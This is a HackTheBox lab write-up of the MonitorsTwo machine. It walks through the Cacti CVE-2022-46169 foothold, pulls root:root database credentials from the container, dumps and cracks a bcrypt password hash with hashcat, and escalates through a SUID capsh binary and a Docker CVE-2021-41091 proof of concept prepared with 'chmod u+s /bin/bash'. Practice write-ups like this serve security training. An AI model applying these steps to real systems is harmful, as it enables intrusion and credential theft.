---
layout: post
title:  "Writeup of MonitorsTwo (HackTheBox)"
date:   2023-11-18 18:06:00 +0000
categories: hackthebox
author: brun0ne
tags: htb hackthebox monitorstwo cacti hashcat
---

# Cacti
There is **Cacti** running on **:80**

```
var cactiVersion='1.2.22';
```

[Known vulnerability for 1.2.2](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

`entrypoint.sh`

# www-data enum

We get a reverse shell as **www-data** in some docker container.

`entrypoint.sh`

```
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

`config.php`

```
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
```

`If we try:`

```
mysql -h db -P 3306 -u root -p cacti
Enter password: asdasd
ERROR 1045 (28000): Access denied for user 'root'@'172.19.0.3' (using password: YES)
```

so **db -> 172.19.0.3**

# Dumping the db

`mysqldump -h db -P 3306 -u root -p cacti > /tmp/dump.sql`

*password: root*

**Dumping data for table user_auth:**

```
admin:Jamie Thompson:admin@monitorstwo.htb:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

guest:Guest Account::43e9a4ab75570f5b

marcus:Marcus Brune:marcus@monitorstwo.htb:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

**Hashes cracked using:**

`.\hashcat.exe .\hash.txt -m 3200 --wordlist rockyou.txt -w 3`

```
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

**There is an interestring SUID binary:**
```
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
```

So we can get **root** inside this container:

`capsh --gid=0 --uid=0 --`

**Container info:**

```
( Enumerating Container )
[+] Container ID ............ 50bca5e748b0
[+] Container Full ID ....... 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.19.0.3 
[+] DNS Server(s) ........... 127.0.0.11 
[+] Host IP ................. 172.19.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.4.0-147-generic
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7302P 16-Core Processor
[+] Useful tools installed .. Yes
```

# SSH - marcus

`ssh marcus@10.10.11.211` with **marcus:funkymonkey** works!

`user.txt: <redacted>`

# Enumeration
```
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

`/var/mail/marcus`

```
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

**CVE-2021-41091** seems to be the right choice, [there is a PoC](https://github.com/UncleJ4ck/CVE-2021-41091).

Running `chmod u+s /bin/bash` as **root** on the **50bca5e748b0** container, and then runnig the PoC - we get root.

`root.txt: <redacted>`